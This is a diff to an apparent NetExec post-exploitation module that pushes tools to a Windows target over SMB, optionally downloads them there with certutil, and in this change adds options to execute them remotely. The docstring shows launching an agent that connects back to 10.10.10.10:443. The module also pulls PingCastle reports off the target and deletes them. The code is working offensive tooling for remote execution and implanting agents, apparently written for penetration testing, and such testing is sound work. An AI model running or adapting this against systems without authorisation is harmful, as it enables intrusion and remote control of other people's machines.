@@ -14,12 +14,15 @@ class NXCModule:
     multiple_hosts = True
 
     def options(self, context, module_options):
-        """
+        """Download tools from the internet or local directory and transfer them to the target system. Disabling LOCAL mode uses certutil to directly download tools on the target system. PingCastle mode downloads, transfers, and executes PingCastle on the target system, extracting the report afterward.
+
         LOCAL           Enable/Disable Local Mode (True/False; default: True)
         MODE            Deployment mode (custom, all, enum, exploit, pingcastle; default: all)
-        DIR             Remote directory for tool transfer (default: C:\\Windows\\Tasks\\)
+        DIR             Remote directory for tool transfer (default: C:/Windows/Tasks/)
         OVERWRITE       Overwrite existing files on target (True/False; default: False)
         CUSTOM          Custom tools (file path, directory, or comma-separated URLs)
+        EXEC            Execute the transferred files (True/False; default: False)
+        ARGS            Arguments to pass to the executed files (string; optional)
 
         nxc smb 192.168.1.1 -u {user} -p {password} -M marbdawg -o MODE=enum
         nxc smb 192.168.1.1 -u {user} -p {password} -M marbdawg -o MODE=enum DIR=C:/Windows/Temp/
@@ -29,12 +32,15 @@ class NXCModule:
         nxc smb 192.168.1.1 -u {user} -p {password} -M marbdawg -o MODE=custom CUSTOM=https://example.com/tool1.exe,https://example.com/tool2.exe
         nxc smb 192.168.1.1 -u {user} -p {password} -M marbdawg -o MODE=pingcastle OVERWRITE=True
         nxc smb 192.168.1.1 -u {user} -p {password} -M marbdawg -o LOCAL=False MODE=exploit
-            """
+        nxc smb 192.168.1.1 -u {user} -p {password} -M marbdawg -o MODE=custom CUSTOM=/path/to/agent.exe EXEC=True ARGS='-connect 10.10.10.10:443' ( If executed program does not exit after execution, you will need to exit nxc with Ctrl+C )
+        """
         self.LOCAL = module_options.get("LOCAL", "True")
         self.MODE = module_options.get("MODE", "all").lower()
         self.location = module_options.get("DIR", "C:\\Windows\\Tasks\\")
         self.overwrite = module_options.get("OVERWRITE", "False").lower()
         custom_tools = module_options.get("CUSTOM", "")
+        self.EXEC = module_options.get("EXEC", "False").lower()
+        self.ARGS = module_options.get("ARGS", "")
         if isinstance(custom_tools, str):
             self.custom_tools = custom_tools.split(",") if custom_tools else []
         elif isinstance(custom_tools, list):
@@ -50,6 +56,7 @@ class NXCModule:
         """Execute the selected technique upon admin login."""
         self.LOCAL = self.LOCAL.lower() == "true"
         self.overwrite = self.overwrite == "true"
+        self.EXEC = self.EXEC.lower() == "true"
         if not self.location.endswith("\\"):
             self.location += "\\"
 
@@ -67,6 +74,9 @@ class NXCModule:
             self.deploy_pingcastle(context, connection)
         else:
             context.log.fail(f"Invalid MODE: {self.MODE}")
+
+        if self.EXEC:
+            self.execute_transferred_files(context, connection)
 
     def handle_local_mode(self, context, connection):
         """Handles the `local` mode for downloading tools locally and serving them via SMB."""
@@ -269,24 +279,27 @@ class NXCModule:
 
         context.log.highlight("Listing PingCastle reports on the target...")
         try:
-            reports = connection.conn.listPath("\\C$", f"{self.location[3:]}*.html")
-            for report in reports:
+            reports = connection.conn.listPath("\\C$", "*")
+            html_reports = [report for report in reports if report._SharedFile__shortname.endswith(".html")]
+            xml_reports = [report for report in reports if report._SharedFile__shortname.endswith(".xml")]
+
+            for report in html_reports + xml_reports:
                 if report.is_directory():
                     continue
-
-                report_filename = report.filename
-                remote_path = f"{self.location[3:]}\\{report_filename}"
+                report_filename = report._SharedFile__shortname
+                remote_path = f"C:\\{report_filename}"
                 local_path = os.path.join(local_dir, report_filename)
 
-                context.log.highlight(f"Downloading {report_filename} to {local_dir}...")
+                context.log.debug(f"Downloading {report_filename} to {local_dir}...")
                 with open(local_path, "wb") as file_stream:
-                    connection.conn.getFile("\\C$", remote_path, file_stream.write)
+                    connection.conn.getFile("\\C$", report_filename, file_stream.write)
 
-                context.log.highlight(f"Successfully transferred {report_filename} to {local_path}.")
+                context.log.display(f"Successfully transferred {report_filename} to {local_path}.")
 
                 delete_command = f'cmd.exe /c "del {remote_path}"'
                 connection.execute(delete_command, True)
-                context.log.highlight(f"Deleted {report_filename} from C:\\")
+                context.log.debug(f"Deleted {report_filename} from C:\\")
+                context.log.highlight(f"You can find the reports in {local_dir}.")
         except Exception as e:
             context.log.fail(f"Failed to transfer reports: {e}")
 
@@ -388,6 +401,31 @@ class NXCModule:
                 context.log.highlight(f"Successfully transferred {tool_name} to {remote_path} on the target.")
             except Exception as e:
                 context.log.fail(f"Failed to transfer {tool_url}: {e}")
+
+    def execute_transferred_files(self, context, connection):
+        """Execute the transferred files with the provided arguments."""
+        context.log.highlight("Executing transferred files...")
+
+        # Collect all transferred files based on MODE
+        tools = self.get_tools_based_on_mode()
+        for tool in tools:
+            filename = tool.split("/")[-1]
+            remote_path = f"{self.location}{filename}".replace("/", "\\")
+            
+            # Check if the file exists on the target
+            check_command = f'cmd.exe /c "if exist {remote_path} (echo {filename} exists) else (echo {filename} not found)"'
+            output = connection.execute(check_command, True)
+            
+            if "exists" in output:
+                exec_command = f'cmd.exe /c "{remote_path}" {self.ARGS}'
+                context.log.highlight(f"Executing {remote_path} with arguments: {self.ARGS}")
+                try:
+                    exec_output = connection.execute(exec_command, True)
+                    context.log.highlight(f"Output of {filename}:\n{exec_output}")
+                except Exception as e:
+                    context.log.fail(f"Failed to execute {filename}: {e}")
+            else:
+                context.log.highlight(f"{filename} does not exist on target, skipping execution.")
 
     def download_tools(self, context, connection, tools):
         """Helper function to download and save tools to the target system."""
